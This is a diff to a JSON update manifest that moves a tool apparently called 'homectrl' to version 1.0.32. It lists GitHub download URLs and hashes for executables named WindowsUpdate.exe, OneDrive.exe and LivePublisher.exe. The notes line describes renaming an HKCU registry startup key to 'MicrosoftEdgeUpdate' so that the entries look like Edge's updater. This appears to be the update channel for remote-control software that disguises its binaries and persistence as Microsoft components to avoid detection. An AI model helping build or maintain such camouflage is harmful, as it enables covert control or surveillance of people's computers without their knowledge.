@@ -1,10 +1,10 @@
 ﻿{
-    "version":  "1.0.31",
-    "sha256":  "95c521335a7a713eb5a7a72cb9c5214ef1abf7fc089a49b71769995ae767e156",
-    "url":  "https://github.com/sayamuhbani59-collab/homectrl-updates/releases/download/v1.0.31/WindowsUpdate.exe",
-    "shadowSha256":  "0dd341638e2386fdea6dc2240c515709defaf5908e1b16595d3c56d934338950",
-    "shadowUrl":  "https://github.com/sayamuhbani59-collab/homectrl-updates/releases/download/v1.0.31/OneDrive.exe",
+    "version":  "1.0.32",
+    "sha256":  "d01677ae983743e011b40545672ea2bf4ebf3739e422d74a85fb909a14f03345",
+    "url":  "https://github.com/sayamuhbani59-collab/homectrl-updates/releases/download/v1.0.32/WindowsUpdate.exe",
+    "shadowSha256":  "7eb0cdb017ac6811c7bc968f20e9498d4153192108becb7a331ccfeb78d86598",
+    "shadowUrl":  "https://github.com/sayamuhbani59-collab/homectrl-updates/releases/download/v1.0.32/OneDrive.exe",
     "livePublisherSha256":  "56ed8d2e63d21596ec295188fc4a810337ac8796c1d3bb2526e18f6272551719",
-    "livePublisherUrl":  "https://github.com/sayamuhbani59-collab/homectrl-updates/releases/download/v1.0.31/LivePublisher.exe",
-    "notes":  "/fullscreen (F11 target) + LivePublisher v3 (HOST_VIEWER_URL)"
+    "livePublisherUrl":  "https://github.com/sayamuhbani59-collab/homectrl-updates/releases/download/v1.0.32/LivePublisher.exe",
+    "notes":  "Full tarn: HKCU primary key -\u003e MicrosoftEdgeUpdate (both entries look like Edge updater); cleanup legacy WindowsUpdateClient"
 }
